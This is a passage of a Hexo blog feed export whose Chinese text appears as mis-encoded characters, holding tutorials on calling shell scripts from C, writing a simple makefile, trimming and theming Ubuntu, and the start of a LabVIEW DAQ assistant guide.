<pre><code class="c">#include &lt;stdlib.h&gt;
...

void func(void)
{
    system(&quot;bash ./&lt;script-filename&gt;.sh&quot;);
    // bashä¸ºé»˜è®¤shellï¼Œä¹Ÿå¯æ”¹ç”¨è¯¸å¦‚&quot;zsh&quot;ç±»çš„shell
}
</code></pre>
<p>æ ¹æ®è¯¥ç”¨æ³•ä¿®æ”¹åŸæœ‰çš„<code>main.c</code></p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &quot;main.h&quot;
#include &quot;add.h&quot;

int main(void)
{
    int a = 10;
    int b = 1;
    int c = add(a,b);

    printf(&quot;%d + %d = %d\n&quot;,a,b,c);
    system(&quot;zsh ./shell.sh&quot;);     // è°ƒç”¨ shell è„šæœ¬

    printf(&quot;Infos:File-%s, Func-%s, Line-%d\n&quot;,__FILE__,__func__,__LINE__);
    /*
    __FILE__ : æ–‡ä»¶å
    __func__ : å‡½æ•°å
    __LINE__ : æ‰€åœ¨è¡Œ
    */

    return 0;
}
</code></pre>
<h2 id="ç¼–è¯‘é“¾æ¥å¹¶æ‰§è¡Œ"><a href="#ç¼–è¯‘é“¾æ¥å¹¶æ‰§è¡Œ" class="headerlink" title="ç¼–è¯‘é“¾æ¥å¹¶æ‰§è¡Œ"></a>ç¼–è¯‘é“¾æ¥å¹¶æ‰§è¡Œ</h2><pre><code class="bash">$ make clean                # æ¸…é™¤ç›®æ ‡æ–‡ä»¶
rm test main.o add.o

$ make                      # ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶
cc    -c -o main.o main.c
cc    -c -o add.o add.c
cc -o test main.o add.o

$ ./test                    # æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶
10 + 1 = 11                 # åŠ æ³•è¿ç®—ç»“æœ
Hello world!                # shell è„šæœ¬æ¬¢è¿è¯­
Please input your strings   # æç¤ºè¯­
whatever                    # æ‰‹åŠ¨è¾“å…¥çš„ä¿¡æ¯  
input_string=whatever       # æ˜¾ç¤ºä¿¡æ¯
Infos:File-main.c, Func-main, Line-14   # æ˜¾ç¤ºæ‰“å°ç¨‹åºæ‰€åœ¨æ–‡ä»¶ã€å‡½æ•°åŠå¯¹åº”è¡Œæ•°
</code></pre>
<p><strong>è¯´æ˜</strong>ï¼šå½“ä½¿ç”¨<code>printf</code>å‡½æ•°æ—¶ï¼Œå¦‚æœä¸åœ¨è¾“å‡ºä¿¡æ¯åæ·»åŠ <code>\n</code>æ¢è¡Œç¬¦çš„è¯ï¼Œå…¶è¾“å‡ºä¿¡æ¯æœ‰å¯èƒ½ä¸<code>shell</code>è„šæœ¬æ‰§è¡Œç»“æœå‘ç”Ÿé”™ä½ã€‚ä¸ºé¿å…è¯¥æƒ…å†µçš„å‘ç”Ÿï¼Œåº”ä¹ æƒ¯åœ¨<code>printf</code>å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­åŠ å…¥æ¢è¡Œç¬¦ã€‚</p>
<h2 id="æ˜¾ç¤ºè„šæœ¬æŒ‡ä»¤"><a href="#æ˜¾ç¤ºè„šæœ¬æŒ‡ä»¤" class="headerlink" title="æ˜¾ç¤ºè„šæœ¬æŒ‡ä»¤"></a>æ˜¾ç¤ºè„šæœ¬æŒ‡ä»¤</h2><p>ä¸ºäº†è¿½è¸ªæ¯ä¸ªè„šæœ¬æŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå¯ä»¥ä¿®æ”¹<code>system</code>å‡½æ•°è°ƒç”¨æ–¹å¼ï¼Œåœ¨<code>bash</code>,<code>zsh</code>åæ·»åŠ é€‰é¡¹<code>-x</code>.</p>
<pre><code class="c">system(&quot;zsh -x ./shell.sh&quot;);
</code></pre>
<p>ä¿®æ”¹åé‡æ–°æ‰§è¡Œmakeï¼Œæ‰§è¡Œ<code>./test</code>å¾—åˆ°ä»¥ä¸‹ç»“æœ</p>
<pre><code class="zsh">$ ./test
10 + 1 = 11
+/etc/zsh/zshenv:15&gt; [[ -z /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin || /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin == /bin:/usr/bin ]]

+./shell.sh:3&gt; echo &#39;Hello world!&#39;
Hello world!

+./shell.sh:4&gt; echo &#39;Please input your strings&#39;
Please input your strings

+./shell.sh:5&gt; read input_string
what

+./shell.sh:6&gt; echo &#39;input_string=what&#39;
input_string=what

Infos:File-main.c, Func-main, Line-14
</code></pre>
<p>ä½¿ç”¨ä¸åŒçš„<code>shell</code>ï¼Œå…¶æ˜¾ç¤ºæ•ˆæœä¸å¤§ä¸€è‡´ï¼Œä¸‹é¢æ˜¯ä½¿ç”¨<code>bash</code>æ‰§è¡Œåçš„æ•ˆæœã€‚</p>
<pre><code class="bash">$ ./test
10 + 1 = 11

+ echo &#39;Hello world!&#39;
Hello world!

+ echo &#39;Please input your strings&#39;
Please input your strings

+ read input_string
what

+ echo input_string=what
input_string=what

Infos:File-main.c, Func-main, Line-14
</code></pre>
<p><strong>è¯´æ˜</strong>ï¼šä¸Šè¿°æ‰§è¡Œè¿‡ç¨‹ä¸­æ˜¾ç¤ºçš„ç©ºè¡Œæ˜¯ä¸ºäº†æ¸…æ¥šæ˜¾ç¤ºæ‰§è¡Œè¿‡ç¨‹æ‰‹åŠ¨æ·»åŠ çš„ï¼Œå®é™…æ‰§è¡Œè¿‡ç¨‹ä¸­å¹¶æ— ç©ºè¡Œã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> C/C++ </tag>
            
            <tag> shell </tag>
            
            <tag> makefile </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[åˆæ¢makefile]]></title>
      <url>https://www.litreily.top/2017/07/25/makefile/</url>
      <content type="html"><![CDATA[<p>åµŒå…¥å¼è½¯ä»¶å¼€å‘å°‘ä¸äº†ä½¿ç”¨makefileè¿›è¡Œè½¯ä»¶ç¼–è¯‘ï¼Œå†™å¥½ä¸€ä¸ªmakefileï¼Œè®©å…¶å®Œæˆæ‰€æœ‰ç¨‹åºä»£ç çš„è‡ªåŠ¨åŒ–ç¼–è¯‘é“¾æ¥ï¼Œå¯ä»¥æé«˜è½¯ä»¶å¼€å‘æ•ˆç‡ã€‚<code>make</code>æ˜¯ä¸€ä¸ªå‘½ä»¤å·¥å…·ï¼Œç”¨äºè§£é‡Šå¹¶æ‰§è¡Œmakefileä¸­çš„æŒ‡ä»¤ã€‚å¤§å¤šæ•°IDEéƒ½æœ‰è¿™ä¸ªå‘½ä»¤å·¥å…·ï¼Œå¦‚<code>Visual C++</code>çš„<code>nmake</code>ï¼Œ<code>Linux</code>ä¸­<code>GNU</code>çš„<code>make</code>ã€‚æœ¬æ–‡ä»¥ä¸€ä¸ªç®€å•ä¾‹å­è¯´æ˜<code>makefile</code>æ–‡ä»¶çš„ä¹¦å†™è§„èŒƒå’Œæ‰§è¡Œè¿‡ç¨‹ã€‚</p>
<h2 id="åˆ›å»ºå¾…ç¼–è¯‘çš„æ–‡ä»¶"><a href="#åˆ›å»ºå¾…ç¼–è¯‘çš„æ–‡ä»¶" class="headerlink" title="åˆ›å»ºå¾…ç¼–è¯‘çš„æ–‡ä»¶"></a>åˆ›å»ºå¾…ç¼–è¯‘çš„æ–‡ä»¶</h2><pre><code class="bash">mkdir mkfiles
vim add.h add.c main.h main.c
</code></pre>
<p>ç„¶åé€ä¸ªç¼–è¾‘å¤´æ–‡ä»¶å’Œæºæ–‡ä»¶ï¼Œå®ç°ä¸€ä¸ªç®€å•çš„åŠ æ³•è¿ç®—ã€‚</p>
<h3 id="add-h"><a href="#add-h" class="headerlink" title="add.h"></a>add.h</h3><p>åŠ æ³•å‡½æ•°æ”¾äº<code>add.c</code>ä¸­ï¼Œå¯¹åº”å¤´æ–‡ä»¶ä¸º<code>add.h</code>ï¼Œç”¨äºå­˜æ”¾å‡½æ•°å£°æ˜ã€‚</p>
<pre><code class="c">#ifndef __ADD_H_
#define __ADD_H_

// declaration functions
int add(int a,int b);

#endif // __ADD_H_
</code></pre>
<h3 id="add-c"><a href="#add-c" class="headerlink" title="add.c"></a>add.c</h3><p>åœ¨<code>add.c</code>ä¸­å®ç°åŠ æ³•å‡½æ•°ã€‚</p>
<pre><code class="c">#include &quot;add.h&quot;

int add(int a, int b)
{
  return a+b;
}
</code></pre>
<h3 id="main-h"><a href="#main-h" class="headerlink" title="main.h"></a>main.h</h3><p>åœ¨ä¸»å‡½æ•°å¯¹åº”çš„å¤´æ–‡ä»¶<code>main.h</code>ä¸­æ·»åŠ ä¾èµ–çš„å¤´æ–‡ä»¶ã€‚</p>
<pre><code class="c">#ifndef __MAIN_H_
#define __MAIN_H_

#include &lt;math.h&gt;

#endif // __MAIN_H_
</code></pre>
<h3 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h3><p>åœ¨<code>main.c</code>ä¸­å®ç°ä¸»å‡½æ•°ï¼Œæ‰“å°å‡ºä¸€ä¸ªåŠ æ³•è¿ç®—ç»“æœã€‚</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &quot;main.h&quot;
#include &quot;add.h&quot;

int main(void)
{
  int a = 10;
  int b = 1;
  int c = add(a,b);
  printf(&quot;%d + %d = %d\n&quot;,a,b,c);
  return 0;
}
</code></pre>
<h2 id="åˆ›å»º-makefile"><a href="#åˆ›å»º-makefile" class="headerlink" title="åˆ›å»º makefile"></a>åˆ›å»º makefile</h2><h3 id="makefile-è§„åˆ™"><a href="#makefile-è§„åˆ™" class="headerlink" title="makefile è§„åˆ™"></a>makefile è§„åˆ™</h3><pre><code class="bash">target ... : prerequisites ...
&lt;tab&gt;   command

...
...
</code></pre>
<p><code>target</code>: ç›®æ ‡æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯.oï¼ˆobject fileï¼‰æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯æœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶<br><code>prerequisites</code> : ç”Ÿæˆç›®æ ‡æ–‡ä»¶æ‰€éœ€çš„æ–‡ä»¶æˆ–æ˜¯ç›®æ ‡ï¼ˆ<code>*.h</code>, <code>*.c</code>, <code>*.o</code>, ...ï¼‰<br><code>command</code>: <code>make</code>éœ€è¦æ‰§è¡Œçš„ç¼–è¯‘ã€é“¾æ¥ç­‰æŒ‡ä»¤ï¼ˆæ‰€æœ‰æŒ‡ä»¤å‰éƒ½ä»¥<code>TAB</code>é”®å¼€å¤´ï¼‰</p>
<h3 id="makefile-åŸºç¡€å†™æ³•"><a href="#makefile-åŸºç¡€å†™æ³•" class="headerlink" title="makefile åŸºç¡€å†™æ³•"></a>makefile åŸºç¡€å†™æ³•</h3><pre><code class="makefile">test : main.o add.o
cc -o test main.o add.o

main.o : main.c main.h add.h
cc -c main.c

add.o : add.c add.h
cc -c add.c

# make clean : use to clean all the object files

.PHONY : clean
clean :
rm test main.o add.o
</code></pre>
<p>å…¶ä¸­ï¼Œtest, main.o, add.oå‡æ˜¯ç›®æ ‡æ–‡ä»¶<code>target</code>ï¼›æ‰€æœ‰æºæ–‡ä»¶åŠå¤´æ–‡ä»¶å‡ä¸º<code>prerequisites</code>ï¼›</p>
<p><code>cc</code> : ç¼–è¯‘å™¨ï¼Œä¸<code>gcc</code>ç›¸ä¼¼ï¼Œ<code>-c</code>ä»£è¡¨ç¼–è¯‘ï¼Œæ‰§è¡Œåäº§ç”Ÿå¯¹è±¡æ–‡ä»¶ï¼Œå³&quot;.o&quot;æ–‡ä»¶ï¼›<code>-o</code>ä»£è¡¨é“¾æ¥ï¼Œç”¨äºé“¾æ¥&quot;.o&quot;æ–‡ä»¶å¹¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼›</p>
<p><code>.PHONY</code> : ç”¨äºå£°æ˜åé¢è·Ÿç€çš„éƒ½æ˜¯ä¼ªç›®æ ‡ï¼ˆç±»ä¼¼äºCè¯­è¨€ä¸­çš„æ ‡ç­¾(Label)ï¼‰ï¼›</p>
<p><code>clean</code> ï¼š ä¸€ä¸ªä¼ªç›®æ ‡ï¼Œåªæœ‰åœ¨å¤–éƒ¨æ‰§è¡Œ<code>make clean</code>æ—¶æ–¹æ‰æ‰§è¡Œç›¸åº”çš„æ‰§è¡Œï¼Œæ­¤æ¬¡ç”¨äºåˆ é™¤ç”Ÿæˆçš„æ‰€æœ‰ç›®æ ‡æ–‡ä»¶ã€‚</p>
<h3 id="makefile-ç®€åŒ–ç‰ˆ1"><a href="#makefile-ç®€åŒ–ç‰ˆ1" class="headerlink" title="makefile ç®€åŒ–ç‰ˆ1"></a>makefile ç®€åŒ–ç‰ˆ1</h3><p>åœ¨<code>makefile</code>ä¸­å¯ä»¥é€šè¿‡<code>$</code>ç¬¦å·å¼•ç”¨å˜é‡ï¼Œç®€åŒ–æ–‡ä»¶ã€‚å˜é‡å®šä¹‰ä»¥ç­‰å·è¿æ¥ï¼Œç±»ä¼¼äºå®å®šä¹‰ï¼Œå°†éœ€è¦å¤šå¤„ä½¿ç”¨çš„å­—ç¬¦ä¸²å­˜å…¥å˜é‡ä¸­å¯ä»¥æ–¹ä¾¿ä¿®æ”¹å’Œç®¡ç†ï¼Œå¦‚æœ¬ä¾‹ï¼Œå¯å®šä¹‰ä»¥ä¸‹å˜é‡ï¼š</p>
<pre><code class="makefile">objs = main.o add.o  # å¼•ç”¨æ–¹æ³• $(objs)
</code></pre>
<p>ç®€åŒ–åçš„<code>makefile</code>å¦‚ä¸‹ï¼š</p>
<pre><code class="makefile">objs = main.o add.o
test : $(objs)
cc -o test $(objs)

main.o : main.c main.h add.h
cc -c main.c

add.o : add.c add.h
cc -c add.c

# make clean : use to clean all the object files

.PHONY : clean
clean :
rm test (objs)
</code></pre>
<p>å½“é¡¹ç›®æ–‡ä»¶å¾ˆå¤šæ—¶ï¼Œåˆç†ä½¿ç”¨å˜é‡å¯ä»¥å¤§å¤§ç®€åŒ–<code>makefile</code>çš„ç¼–å†™å’Œä¿®æ”¹ã€‚</p>
<h3 id="makefile-ç®€åŒ–ç‰ˆ2"><a href="#makefile-ç®€åŒ–ç‰ˆ2" class="headerlink" title="makefile ç®€åŒ–ç‰ˆ2"></a>makefile ç®€åŒ–ç‰ˆ2</h3><p>è¦çŸ¥é“ï¼Œ<code>make</code>éå¸¸å¼ºå¤§ï¼Œå…·æœ‰<strong>è‡ªåŠ¨æ¨å¯¼</strong>çš„åŠŸèƒ½ï¼Œå¯ä»¥è‡ªåŠ¨æ¨å¯¼&quot;.o&quot;ç›®æ ‡æ–‡ä»¶ä¸‹é¢çš„æŒ‡ä»¤ã€‚å¦‚æœç›®æ ‡æ–‡ä»¶ä¸º&quot;main.o&quot;ï¼Œé‚£ä¹ˆæŒ‡ä»¤å¿…ç„¶ä¸º&quot;cc -c main.c&quot;ï¼Œä¾èµ–äº<code>make</code>æŒ‡ä»¤çš„æ¨å¯¼åŠŸèƒ½ï¼Œ<code>makefile</code>å¯ä»¥çœç•¥è¯¥æŒ‡ä»¤çš„ç¼–å†™ã€‚</p>
<p>æ­¤å¤–ï¼Œæ¯ä¸ª&quot;.o&quot;ç›®æ ‡æ–‡ä»¶çš„ä¾èµ–æ–‡ä»¶å¿…ç„¶åŒ…å«ä¸€ä¸ªæ–‡ä»¶åç›¸åŒçš„&quot;.c&quot;æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯ä»¥é€šè¿‡è‡ªåŠ¨æ¨å¯¼å¾—å‡ºï¼Œæ‰€ä»¥åœ¨<code>makefile</code>ä¸­åŒæ ·å¯ä»¥çœç•¥ã€‚</p>
<p>æ ¹æ®ä»¥ä¸Šè§„åˆ™å¯ä»¥å¯¹<code>makefile</code>è¿›ä¸€æ­¥ç®€åŒ–ï¼š</p>
<pre><code class="makefile">objs = main.o add.o
test : $(objs)
cc -o test $(objs)

main.o : main.h add.h
add.o : add.h

# make clean : use to clean all the object files

.PHONY : clean
clean :
rm test (objs)
</code></pre>
<h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>ç¼–å†™å¥½<code>makefile</code>æ–‡ä»¶åï¼Œä¾¿å¯ä»¥ä½¿ç”¨<code>make</code>æŒ‡ä»¤è¿›è¡Œç¼–è¯‘é“¾æ¥å¹¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶äº†ã€‚</p>
<pre><code class="bash">$ make  # ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶
cc -c main.c
cc -c add.c
cc -o test main.o add.o
$ ls
add.c  add.h  add.o  main.c  main.h  main.o  makefile  test
$ ./test  # æ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶
10 + 1 = 11
$ make clean  # æ¸…é™¤æ‰€æœ‰ç›®æ ‡æ–‡ä»¶
rm test main.o add.o
$ ls
add.c  add.h  main.c  main.h  makefile
</code></pre>
<p>è‡³æ­¤ï¼Œä¸€ä¸ªç®€å•çš„<code>makefile</code>ç¼–å†™è¿‡ç¨‹åŠæ‰§è¡Œè¿‡ç¨‹ä¾¿ç»“æŸäº†ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> C/C++ </tag>
            
            <tag> makefile </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å®‰è£…Ubuntuåçš„ç³»ç»Ÿç²¾ç®€ä¸ç¾åŒ–]]></title>
      <url>https://www.litreily.top/2017/06/11/initial-ubuntu/</url>
      <content type="html"><![CDATA[<p>å®‰è£…å¥½Ubuntuç³»ç»Ÿåï¼Œé€šå¸¸éœ€è¦å¸è½½è®¸å¤šç”¨ä¸ä¸Šçš„è½¯ä»¶ï¼Œå¹¶å®‰è£…ä¸€äº›å¸¸ç”¨ä»¥åŠå®ç”¨çš„è½¯ä»¶ã€‚å½“ç„¶ï¼ŒUbuntué»˜è®¤çš„ä¸»é¢˜å®åœ¨ä¸æ•¢æ­ç»´ï¼Œä¸ºæ­¤æœ‰å¿…è¦æ¢ä¸€å¥—ä¸»é¢˜äºˆä»¥ç¾åŒ–ã€‚</p>
<h2 id="ç³»ç»Ÿç²¾ç®€"><a href="#ç³»ç»Ÿç²¾ç®€" class="headerlink" title="ç³»ç»Ÿç²¾ç®€"></a>ç³»ç»Ÿç²¾ç®€</h2><p>åˆ é™¤ä¸å¿…è¦çš„è½¯ä»¶</p>
<h3 id="åˆ é™¤libreoffice"><a href="#åˆ é™¤libreoffice" class="headerlink" title="åˆ é™¤libreoffice"></a>åˆ é™¤libreoffice</h3><pre><code class="bash">sudo apt-get remove libreoffice-common
</code></pre>
<h3 id="åˆ é™¤Amazoné“¾æ¥"><a href="#åˆ é™¤Amazoné“¾æ¥" class="headerlink" title="åˆ é™¤Amazoné“¾æ¥"></a>åˆ é™¤Amazoné“¾æ¥</h3><pre><code class="bash">sudo apt-get remove unity-webapps-common
</code></pre>
<h3 id="åˆ é™¤å…¶å®ƒæå°‘ç”¨çš„è½¯ä»¶"><a href="#åˆ é™¤å…¶å®ƒæå°‘ç”¨çš„è½¯ä»¶" class="headerlink" title="åˆ é™¤å…¶å®ƒæå°‘ç”¨çš„è½¯ä»¶"></a>åˆ é™¤å…¶å®ƒæå°‘ç”¨çš„è½¯ä»¶</h3><pre><code class="bash">sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku
sudo apt-get remove onboard deja-dup
</code></pre>
<h2 id="å¸¸ç”¨è½¯ä»¶å®‰è£…"><a href="#å¸¸ç”¨è½¯ä»¶å®‰è£…" class="headerlink" title="å¸¸ç”¨è½¯ä»¶å®‰è£…"></a>å¸¸ç”¨è½¯ä»¶å®‰è£…</h2><h3 id="å¸¸ç”¨å·¥å…·"><a href="#å¸¸ç”¨å·¥å…·" class="headerlink" title="å¸¸ç”¨å·¥å…·"></a>å¸¸ç”¨å·¥å…·</h3><pre><code class="bash">sudo apt-get install vim    # Vim
sudo apt-get install git    # Git
</code></pre>
<p>å®‰è£…<code>Git</code>ä¹‹åéœ€è¦é…ç½®ä»¥ä¸‹å…¨å±€å˜é‡ï¼Œå¹¶ç”Ÿæˆ<code>ssh-key</code></p>
<pre><code class="bash">git config --global user.email &quot;emailname@email.com&quot;
git config --global user.name &quot;username&quot;
ssh-keygen -t rsa -C &quot;emailname@email.com&quot;
cd ~/.ssh
gedit id_rsa.pub    # å°†æ–‡ä»¶å†…å®¹æ·»åŠ è‡³githubæˆ–å…¶å®ƒä»£ç æ‰˜ç®¡å¹³å°
</code></pre>
<h3 id="ç³»ç»ŸæŒ‡ç¤ºå™¨Syspeek"><a href="#ç³»ç»ŸæŒ‡ç¤ºå™¨Syspeek" class="headerlink" title="ç³»ç»ŸæŒ‡ç¤ºå™¨Syspeek"></a>ç³»ç»ŸæŒ‡ç¤ºå™¨Syspeek</h3><pre><code class="bash">sudo add-apt-repository ppa:nilarimogard/webupd8
sudo apt-get update
sudo apt-get install syspeek  
</code></pre>
<h3 id="Hexo-amp-amp-Gitbook"><a href="#Hexo-amp-amp-Gitbook" class="headerlink" title="Hexo &amp;&amp; Gitbook"></a>Hexo &amp;&amp; Gitbook</h3><p>é¦–å…ˆå®‰è£…<code>node.js</code>ä¸<code>npm</code>,ç„¶åä½¿ç”¨<code>npm</code>å®‰è£…<code>hexo</code>ä¸<code>gitbook</code></p>
<pre><code class="bash">npm install hexo-cli -g
npm install -g gitbook-cli
gitbook -V
</code></pre>
<h3 id="å¿…å¤‡è½¯ä»¶"><a href="#å¿…å¤‡è½¯ä»¶" class="headerlink" title="å¿…å¤‡è½¯ä»¶"></a>å¿…å¤‡è½¯ä»¶</h3><ul>
<li>æ±‰å­—è¾“å…¥æ³•ï¼š æœç‹—æ‹¼éŸ³</li>
<li>éŸ³ä¹æ’­æ”¾å™¨ï¼š ç½‘æ˜“äº‘éŸ³ä¹</li>
</ul>
<pre><code class="bash">sudo dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb   # ä¸‹è½½å®‰è£…åŒ…åæ‰§è¡Œè¯¥æŒ‡ä»¤
sudo apt-get -f install
</code></pre>
<ul>
<li>è§†é¢‘æ’­æ”¾å™¨ï¼š VLCï¼ˆè‡ªå¸¦software ç®¡ç†è½¯ä»¶ä¸­ä¸‹è½½å®‰è£…ï¼‰</li>
<li>ç½‘ç»œæµè§ˆå™¨ï¼š Google Chrome</li>
</ul>
<pre><code class="bash">sudo dpkg -i google-chrome-stable_current_amd64.deb   # ä¸‹è½½å®‰è£…åŒ…åæ‰§è¡Œè¯¥æŒ‡ä»¤
sudo apt-get -f install
</code></pre>
<ul>
<li>æˆªå›¾è½¯ä»¶ï¼š Shutter</li>
<li>ç¤¾äº¤è½¯ä»¶ï¼š <a href="https://github.com/geeeeeeeeek/electronic-wechat.git" target="_blank" rel="noopener">å¾®ä¿¡</a></li>
<li>åŠå…¬è½¯ä»¶ï¼š WPS</li>
</ul>
<h2 id="ç³»ç»Ÿç¾åŒ–"><a href="#ç³»ç»Ÿç¾åŒ–" class="headerlink" title="ç³»ç»Ÿç¾åŒ–"></a>ç³»ç»Ÿç¾åŒ–</h2><p>å‚è€ƒèµ„æ–™ï¼š<a href="http://www.jcodecraeer.com/plus/view.php?aid=3502" target="_blank" rel="noopener">http://www.jcodecraeer.com/plus/view.php?aid=3502</a></p>
<h3 id="å®‰è£…Flatabulousä¸»é¢˜"><a href="#å®‰è£…Flatabulousä¸»é¢˜" class="headerlink" title="å®‰è£…Flatabulousä¸»é¢˜"></a>å®‰è£…Flatabulousä¸»é¢˜</h3><ul>
<li>é¦–å…ˆå®‰è£… Unity-tweak-toolè½¯ä»¶ï¼ˆä»Ubuntuè½¯ä»¶å•†åº—å¯ä»¥æ‰¾åˆ°ï¼‰</li>
<li>ç„¶ååœ¨<code>~</code>ç›®å½•ä¸‹åˆ›å»ºç³»ç»Ÿä¸»é¢˜æ–‡ä»¶å¤¹<code>.themes</code></li>
</ul>
<pre><code class="bash">mkdir ~/.themes
</code></pre>
<ul>
<li>åœ¨<a href="https://github.com/anmoljagetia/Flatabulous/archive/master.zip" target="_blank" rel="noopener">https://github.com/anmoljagetia/Flatabulous/archive/master.zip</a> ä¸‹è½½ Flatabulous ä¸»é¢˜</li>
<li>è§£å‹ä¸»é¢˜åç§»åŠ¨åˆ°<code>~/.themes</code>æ–‡ä»¶å¤¹ä¸‹</li>
<li>æ‰“å¼€tweakè½¯ä»¶ï¼Œåœ¨themeé¢æ¿ä¸­é€‰æ‹©Flatabulousä¸»é¢˜</li>
</ul>
<h3 id="å®‰è£…ultra-flat-iconså›¾æ ‡ä¸»é¢˜"><a href="#å®‰è£…ultra-flat-iconså›¾æ ‡ä¸»é¢˜" class="headerlink" title="å®‰è£…ultra-flat-iconså›¾æ ‡ä¸»é¢˜"></a>å®‰è£…ultra-flat-iconså›¾æ ‡ä¸»é¢˜</h3><ul>
<li>å®‰è£…å›¾æ ‡ä¸»é¢˜</li>
</ul>
<pre><code class="bash">sudo add-apt-repository ppa:noobslab/icons  
sudo apt-get update  
sudo apt-get install ultra-flat-icons
</code></pre>
<ul>
<li>åœ¨tweakè½¯ä»¶ä¸­çš„iconé¢æ¿ä¸­é€‰æ‹©Ultra-flat</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Labview - DAQ åŠ©æ‰‹è¯¦è§£]]></title>
      <url>https://www.litreily.top/2017/04/24/labview-DAQ/</url>
      <content type="html"><![CDATA[<h2 id="DAQ-åŠ©æ‰‹ç®€ä»‹"><a href="#DAQ-åŠ©æ‰‹ç®€ä»‹" class="headerlink" title="DAQ åŠ©æ‰‹ç®€ä»‹"></a>DAQ åŠ©æ‰‹ç®€ä»‹</h2><h3 id="Express-VI"><a href="#Express-VI" class="headerlink" title="Express VI"></a>Express VI</h3><p><code>Express VI</code> æ˜¯ LabVIEW 7 åŠæ›´é«˜ç‰ˆæœ¬æ‹¥æœ‰çš„å¿«é€Ÿ VIï¼Œæ­¤ç±» VI å°†ä¸€äº›å¸¸è§çš„åŠŸèƒ½æ‰“åŒ…ï¼Œç„¶åå°è£…åœ¨ç®€å•æ˜“ç”¨çš„äº¤äº’å¼çš„ VI ç¨‹åºä¸­ï¼Œæ–¹ä¾¿å¼€å‘äººå‘˜é…ç½®å‚æ•°å’Œå®ç°åŠŸèƒ½ã€‚</p>
<p><code>DAQ</code> åŠ©æ‰‹æ˜¯å®Œæˆä¿¡å·é‡‡é›†ä»»åŠ¡çš„å¸¸ç”¨å·¥å…·ï¼Œä»¥ <code>Express VI</code> çš„å½¢å¼å‘ˆç°ï¼Œå…·æœ‰äº¤äº’å¼çš„é…ç½®ç•Œé¢ï¼Œé…åˆ NI å…¬å¸æä¾›çš„é‡‡é›†å¡ï¼Œå¯ä»¥å®Œæˆç»å¤§éƒ¨åˆ†çš„ä¿¡å·é‡‡é›†ä»»åŠ¡ã€‚</p>
<h3 id="ä½¿ç”¨æ–¹æ³•ç®€è¿°ï¼ˆé‡‡é›†-AI-ä¿¡å·ï¼‰"><a href="#ä½¿ç”¨æ–¹æ³•ç®€è¿°ï¼ˆé‡‡é›†-AI-ä¿¡å·ï¼‰" class="headerlink" title="ä½¿ç”¨æ–¹æ³•ç®€è¿°ï¼ˆé‡‡é›† AI ä¿¡å·ï¼‰"></a>ä½¿ç”¨æ–¹æ³•ç®€è¿°ï¼ˆé‡‡é›† AI ä¿¡å·ï¼‰</h3><h4 id="é€‰æ‹©ä¿¡å·ç±»å‹"><a href="#é€‰æ‹©ä¿¡å·ç±»å‹" class="headerlink" title="é€‰æ‹©ä¿¡å·ç±»å‹"></a>é€‰æ‹©ä¿¡å·ç±»å‹</h4><p><img src="/assets/labview/daqAssistant/selectSignal.png" alt="DAQåŠ©æ‰‹ä¿¡å·ç±»å‹é€‰æ‹©ç•Œé¢"></p>
<p>åœ¨é‡‡é›†å¡ï¼ˆè™šæ‹Ÿçš„æˆ–å®é™…çš„å‡å¯ï¼‰å·²è¿æ¥çš„æƒ…å†µä¸‹ï¼Œä» VI çš„ç¨‹åºæ¡†å›¾ä¸­æ‰“å¼€ <code>DAQ</code> åŠ©æ‰‹ï¼Œé€‰æ‹©å¾…é‡‡é›†ä¿¡å·çš„ç±»å‹ï¼Œæ­¤å¤„é€‰æ‹©æ¨¡æ‹Ÿè¾“å…¥ç”µå‹ä¿¡å·ã€‚</p>
<h4 id="é€‰æ‹©ç‰©ç†é€šé“"><a href="#é€‰æ‹©ç‰©ç†é€šé“" class="headerlink" title="é€‰æ‹©ç‰©ç†é€šé“"></a>é€‰æ‹©ç‰©ç†é€šé“</h4><p><img src="/assets/labview/daqAssistant/selectChannel.png" alt="DAQåŠ©æ‰‹ç‰©ç†é€šé“é€‰æ‹©ç•Œé¢"></p>
<p>é€‰æ‹©é€šé“æ—¶ï¼ŒæŒ‰ä½<code>Ctrl</code> æˆ– <code>Shift</code> å¯åŒæ—¶é€‰æ‹©å¤šè·¯é€šé“</p>
